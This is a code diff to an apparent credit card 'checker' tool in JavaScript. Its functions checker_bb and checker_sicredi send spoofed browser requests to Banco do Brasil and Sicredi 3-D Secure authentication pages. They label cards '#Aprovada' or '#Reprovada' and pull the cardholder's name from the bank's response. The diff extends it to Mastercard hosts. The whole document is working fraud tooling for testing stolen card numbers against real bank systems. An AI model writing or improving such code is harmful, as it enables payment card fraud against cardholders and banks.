@@ -3,6 +3,9 @@ import { load } from "cheerio";
 import { CookieJar } from "tough-cookie";
 
 export async function checker_bb(card_params) {
+    if (card_params.substring(0, 1) != '4' && card_params.substring(0, 1) != '5') {
+        return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ incompatible card</font>`;
+    }
     if (card_params.substring(0, 1) == '4') {
         var c_url = 'www58.bb.com.br';
         var secureUrl = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin';
@@ -10,8 +13,6 @@ export async function checker_bb(card_params) {
     if (card_params.substring(0, 1) == '5') {
         var c_url = 'www66.bb.com.br';
         var secureUrl = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin';
-    } else {
-        return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ incompatible card</font>`;
     }
 
     //split with multiple separators -> |,.:;/
@@ -103,8 +104,17 @@ export async function checker_bb(card_params) {
     }
 }
 
-
 export async function checker_sicredi(card_params) {
+    if (card_params.substring(0, 1) != '4' && card_params.substring(0, 1) != '5') {
+        return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ incompatible card</font>`;
+    }
+    if (card_params.substring(0, 1) == '4') {
+        var c_url = 'verifiedbyvisa.secureacs.com';
+    }
+    if (card_params.substring(0, 1) == '5') {
+        var c_url = 'mastercardsecurecode.secureacs.com';
+    }
+
     //split with multiple separators -> |,.:;/
     const split_card = card_params.split(/[\s|,.:;/]+/);
 
@@ -143,7 +153,7 @@ export async function checker_sicredi(card_params) {
 
         const req_two = await client.post(value_url, {
             headers: {
-                'Host': 'verifiedbyvisa.secureacs.com',
+                'Host': c_url,
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                 'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
@@ -173,14 +183,14 @@ export async function checker_sicredi(card_params) {
 
         const req_tree = await client.post(redirect, {
             headers: {
-                'Host': 'verifiedbyvisa.secureacs.com',
+                'Host': c_url,
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                 'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
                 'Content-Type': 'application/x-www-form-urlencoded',
-                'Origin': 'https://verifiedbyvisa.secureacs.com',
+                'Origin': `https://${c_url}`,
                 'Connection': 'keep-alive',
-                'Referer': 'https://verifiedbyvisa.secureacs.com/AcsPreAuthenticationWEB/PreAuthenticationServlet',
+                'Referer': `https://${c_url}/AcsPreAuthenticationWEB/PreAuthenticationServlet`,
             },
             body: `IdSession=${encodeURIComponent(IdSession)}&UrlReturn=${encodeURIComponent(UrlReturn)}&TokenWeb=${encodeURIComponent(TokenWeb)}&TokenWebReturn=${encodeURIComponent(TokenWebReturn)}`,
             https: {
@@ -189,13 +199,13 @@ export async function checker_sicredi(card_params) {
             responseType: 'text',
         });
 
-        const req_for = await client('https://verifiedbyvisa.secureacs.com/AuthSystemSicrediWEB/pages/authentication.jsf', {
+        const req_for = await client(`https://${c_url}/AuthSystemSicrediWEB/pages/authentication.jsf`, {
             headers: {
-                'Host': 'verifiedbyvisa.secureacs.com',
+                'Host': c_url,
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                 'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
-                'Referer': 'https://verifiedbyvisa.secureacs.com/AcsPreAuthenticationWEB/PreAuthenticationServlet',
+                'Referer': `https://${c_url}/AcsPreAuthenticationWEB/PreAuthenticationServlet`,
                 'Connection': 'keep-alive',
             },
             https: {
@@ -209,7 +219,7 @@ export async function checker_sicredi(card_params) {
         const nome_client = html3('[class="hst_bank_body_1_font"]').text().split('.')[0].trim().replace('Olá ', '');
 
         if (JSON.stringify(req_for).includes('hst_bank_body_1_font') == true) {
-            return `<font style="color: green;">#Aprovada ${card_params} ➜ ${nome_client} ➜ authorized </font>`;
+            return `<font style="color: green;">#Aprovada ${card_params} ➜ ${nome_client} ➜ authorized</font>`;
         } else {
             return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ card declined</font>`;
         }
